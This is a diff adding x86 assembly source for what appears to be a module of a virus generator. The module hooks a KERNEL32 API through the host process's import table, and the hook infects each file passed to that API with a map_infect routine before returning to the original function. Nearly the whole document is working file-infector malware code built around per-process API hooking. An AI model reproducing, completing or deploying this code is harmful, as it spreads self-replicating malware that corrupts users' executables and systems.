@@ -1,0 +1,139 @@
+;%%%7 1 PERP Hook API in host to infect (per process)
+
+;###GetModuleHandleA
+;###FindClose
+;###FindFirstFileA
+infect_files:
+	pushad
+
+;get current file image base
+
+	push 0
+	call delta
+	call [ebp+_GetModuleHandleA]
+	mov edi,eax
+
+;get pointer to import structures
+
+	add eax,[edi.MZ_lfanew]
+	mov ecx,[eax.NT_OptionalHeader.OH_DataDirectory.DE_Import.DD_VirtualAddress]
+	test ecx,ecx
+	jz @@exit
+	add ecx,edi
+
+;get DLL name and setup for latter compare
+
+  @@dll_check:
+	mov esi,[ecx.ID_Name]
+	test esi,esi
+	jz @@exit
+	add esi,edi
+	push esi
+	mov ebx,esp
+
+;before compare, put it in uppercase
+
+  @@fixdllname:
+	lodsb
+	test al,al
+	je @@set0
+	cmp al,"."
+	je @@set0
+	cmp al,"a"
+	jb @@fixdllname
+	cmp al,"z"
+	ja @@fixdllname
+  	and by [esi-1],not 20h
+	jmp @@fixdllname
+  @@set0:
+  	mov by [esi-1],0
+
+	lea esi,[ebp+ofs kernel32dll]
+	COMPARE
+	pop eax
+	jz @@found_kernel32
+
+;check next dll in import table
+
+	add ecx,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
+	jmp @@dll_check
+
+;now that the import descriptor for kernel32 was found, find API and hook
+
+  @@found_kernel32:
+	mov edx,[ecx.ID_OriginalFirstThunk]
+	add edx,edi
+	lea esi,[ebp+ofs api2hook]
+
+;check api name (skipping hint ordinal)
+
+  @@next_api:
+	mov eax,[edx]
+	test eax,eax
+	jz @@exit
+
+	lea eax,[eax.edi+2]
+	push eax
+	mov ebx,esp
+	COMPARE
+	pop eax
+	jz @@found_api
+
+;check next api in import table from kernel32
+
+  	add edx,4
+  	jmp @@next_api
+
+  @@found_api:
+	sub edx,[ecx.ID_OriginalFirstThunk]
+	add edx,[ecx.ID_FirstThunk]
+
+;hook the api
+
+	lea eax,[ebp+ofs apientry]
+	xchg [edx],eax
+	mov dwo [ebp+ofs original_api],eax
+	jmp @@exit
+
+  @@exit:
+	popad
+	ret
+
+
+;this is our hook
+
+apientry:
+	pushad
+
+;check if file exists (and setup stack for infection)
+
+	sub esp,SIZEOF_WIN32_FIND_DATA
+	push esp
+	push dwo [esp.cPushad.Arg1+SIZEOF_WIN32_FIND_DATA+4]
+	call delta
+	call [ebp+_FindFirstFileA]
+	cmp eax,-1
+	je @@exit
+
+;infect file
+
+	call map_infect
+  	push eax
+  	call [ebp+_FindClose]
+
+;return to original api handler
+
+  @@exit:
+	add esp,SIZEOF_WIN32_FIND_DATA
+	popad
+	push 12345678h
+  original_api equ $-4
+  	ret
+
+
+api2hook:
+	CHASH %s
+
+kernel32dll:
+ 	CHASH KERNEL32
+
